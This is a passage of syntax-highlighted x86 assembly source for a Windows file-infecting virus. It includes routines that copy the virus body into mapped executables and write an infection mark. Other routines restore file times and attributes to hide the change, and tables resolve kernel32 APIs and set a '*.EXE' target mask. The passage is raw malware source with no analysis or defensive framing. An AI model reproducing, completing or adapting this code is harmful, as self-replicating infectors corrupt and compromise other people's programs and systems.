        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; add PointerToRawData</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mapbase</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; EDI=virus offset in memmap</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                            </span><span class="sc1">; ESI=start virus body</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virus_raw_size</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">host_entry_RVA</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">virus_RVA</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">58h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">      </span><span class="sc1">; set our infection mark</span><span class="sc0">

</span><span class="sc5">unmap_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">UnmapViewOfFile</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">close_filemapping</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CloseHandle</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">set_filesize</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">; move relative to start of file</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">; high word pointer of file offset</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileSize</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; new filesize</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">; filehandle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SetFilePointer</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">; filehandle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SetEndOfFile</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">restore_filetime</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LastWriteTime</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SetFileTime</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CloseHandle</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">restore_attributes</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SetFileAttributesA</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">exit_infect_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">align_eax</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; remainer zero?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">no_round_up</span><span class="sc0">                          </span><span class="sc1">; if so, don't round up</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">; round up</span><span class="sc0">
</span><span class="sc5">no_round_up</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                 </span><span class="sc1">; multiply again</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">


</span><span class="sc5">make_writeable</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dummy</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">; var to store old protection</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">; PAGE_READWRITE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">; one dword </span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">; RVA</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VirtualProtect</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">



</span><span class="sc5">kernel32A</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"KERNEL32"</span><span class="sc0">
</span><span class="sc5">l_kernel32A</span><span class="sc0">             </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">kernel32A</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">kernel32W</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc3">"K"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"E"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"R"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"N"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"E"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"L"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"3"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"2"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">n_GetModuleHandleA</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetModuleHandleA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_LoadLibraryA</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"LoadLibraryA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_GetModuleHandleW</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetModuleHandleW"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_LoadLibraryW</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"LoadLibraryW"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_GetProcAddress</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetProcAddress"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">l_GetProcAddress</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">n_GetProcAddress</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">n_FindFirstFileA</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"FindFirstFileA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_FindNextFileA</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"FindNextFileA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_FindClose</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"FindClose"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">n_GetWindowsDirectoryA</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetWindowsDirectoryA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_GetCurrentDirectoryA</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetCurrentDirectoryA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">n_GetFileAttributesA</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetFileAttributesA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_SetFileAttributesA</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetFileAttributesA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_CreateFileA</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CreateFileA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_GetFileSize</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetFileSize"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_GetFileTime</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetFileTime"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_SetFileTime</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetFileTime"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_CreateFileMappingA</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CreateFileMappingA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_MapViewOfFile</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"MapViewOfFile"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_SetEndOfFile</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetEndOfFile"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_SetFilePointer</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetFilePointer"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_UnmapViewOfFile</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"UnmapViewOfFile"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_CloseHandle</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CloseHandle"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">n_VirtualProtect</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"VirtualProtect"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">n_SetCurrentDirectoryA</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetCurrentDirectoryA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">n_SetCurrentDirectoryW</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetCurrentDirectoryW"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">



</span><span class="sc5">init_api_ptrs</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">n_GetModuleHandleA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">n_LoadLibraryA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">n_GetModuleHandleW</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">n_LoadLibraryW</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">n_GetProcAddress</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">kernel32_APIname_pointers</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">n_LoadLibraryA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">n_FindFirstFileA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">n_FindNextFileA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">n_FindClose</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">n_GetWindowsDirectoryA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">n_GetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">n_GetFileAttributesA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">n_SetFileAttributesA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">n_CreateFileA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">n_GetFileSize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">n_GetFileTime</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">n_SetFileTime</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">n_CreateFileMappingA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">n_MapViewOfFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">n_SetEndOfFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">n_SetFilePointer</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">n_UnmapViewOfFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">n_CloseHandle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">n_VirtualProtect</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">n_SetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">n_SetCurrentDirectoryW</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">number_of_kernel32_APIs</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">kernel32_APIname_pointers</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc5">filemask</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"*.EXE"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">virus_physical_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">return_address</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">dummy</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">mapbase</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">imagebase</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">kernel32</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">kernel32descr</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">aligned_filesize</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">


</span><span class="sc5">init_api_VAs</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">GetModuleHandleA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetModuleHandleW</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetProcAddress</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">


</span><span class="sc5">kernel32_API_RVAs</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">LoadLibraryA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FindFirstFileA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FindNextFileA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FindClose</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetCurrentDirectoryA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetFileAttributesA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SetFileAttributesA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CreateFileA</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetFileSize</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetFileTime</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SetFileTime</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CreateFileMappingA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">MapViewOfFile</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SetEndOfFile</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SetFilePointer</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">UnmapViewOfFile</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CloseHandle</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">VirtualProtect</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_SetCurrentDirectoryW</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">



</span><span class="sc5">find_data</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">FileAttributes</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CreationTime</span><span class="sc0">            </span><span class="sc9">dq</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
